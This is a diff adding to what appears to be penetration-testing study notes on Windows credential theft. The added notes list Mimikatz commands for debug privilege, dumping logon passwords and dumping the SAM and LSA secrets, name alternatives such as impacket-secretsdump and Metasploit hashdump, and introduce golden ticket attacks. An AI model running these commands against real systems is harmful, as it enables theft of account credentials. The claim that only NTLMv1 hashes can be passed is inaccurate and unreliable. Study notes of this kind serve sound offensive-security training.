@@ -605,3 +605,55 @@ Original:
 * <mark style="color:yellow;">Therefore bypassing Anti-Virus</mark>
 
 {% embed url="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1" %}
+
+## Mimikatz Capabilities
+
+We need to be able to bypass memory protections such as lsass.exe. This can be done with privilege::debug.
+
+LSA is Local Security Authority
+
+### Wiki
+
+{% embed url="https://github.com/gentilkiwi/mimikatz/wiki" %}
+
+### Credential Dumping
+
+```
+mimikatz.exe
+
+mimikatz # privilege::debug
+Privilege '20' OK
+```
+
+### Dumping logon passwords
+
+This is for all logged on users:
+
+```
+mimikatz # sekurlsa::logonpasswords
+```
+
+* You can get an NTLM hash
+* If it is NTLMv1 you can pass it!
+
+### Dumping SAM
+
+```
+mimikatz # lsadump::sam
+
+mimikatz # lsadump::sam /patch
+
+mimikatz # lsadump::lsa /patch
+```
+
+<mark style="color:yellow;">Other ways of dumping the sam:</mark>
+
+* If this does not work, you can download the SAM to Kali and dump it
+* You can use impacket-secretsdump
+* Get a shell with metasploit and do hashdump
+
+## Golden Ticket Attacks
+
+* <mark style="color:yellow;">Have access to the krbtgt hash?</mark>
+* This is the Kerberos Ticket Granting Ticket account
+* This allows us to generate tickets!
